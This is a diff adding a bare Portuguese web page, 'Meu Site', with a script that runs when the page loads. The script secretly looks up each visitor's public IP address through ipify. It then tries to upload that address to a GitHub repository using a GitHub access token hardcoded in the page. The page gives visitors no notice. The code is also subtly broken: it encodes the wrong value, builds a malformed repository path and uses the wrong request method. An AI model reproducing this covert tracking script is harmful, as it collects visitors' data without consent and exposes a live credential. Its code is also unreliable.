@@ -1,0 +1,62 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Meu Site</title>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            fetch('https://api.ipify.org/?format=json')
+  .then(response => response.json())
+  .then(data => {
+    const ip = data.ip;
+const blob = new Blob([ip], { type: "text/plain" });
+const urls = URL.createObjectURL(blob);
+const link = document.createElement("a");
+link.href = urls;
+link.download = "endereco_ip.txt";
+    // faça o que precisa com o endereço IP, como salvar em um arquivo txt
+const linkGerado = link;
+const conteudoCodificado = btoa(linkGerado); // Codifica o link em base64
+const dono = "Knlss";
+const repositorio = "Knlss/Ips";
+const caminho = "docs/endereco_ip.txt";
+const mensagem = "Adicionando link gerado";
+const url = `https://api.github.com/repos/${dono}/${repositorio}/contents/${caminho}`;
+const token = "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";
+const headers = {
+  "Authorization": `Token ${token}`,
+  "Content-Type": "application/json"
+};
+const data = {
+  message: mensagem,
+  content: conteudoCodificado
+};
+fetch(url, {
+  method: "POST",
+  headers: headers,
+  body: JSON.stringify(data)
+})
+  .then(response => {
+    if (response.ok) {
+      console.log("Link gerado adicionado com sucesso!");
+    } else {
+      console.error("Erro ao adicionar o link gerado:", response.status);
+    }
+  })
+  .catch(error => {
+    console.error("Erro na requisição:", error);
+  });
+    console.log(ip);
+  })
+  .catch(error => {
+    console.error('Erro ao obter o endereço IP:', error);
+  });
+            console.log("Script rodando!");
+        });
+    </script>
+</head>
+<body>
+    <h1>Meu Site</h1>
+    <!-- Conteúdo do site -->
+</body>
+</html>
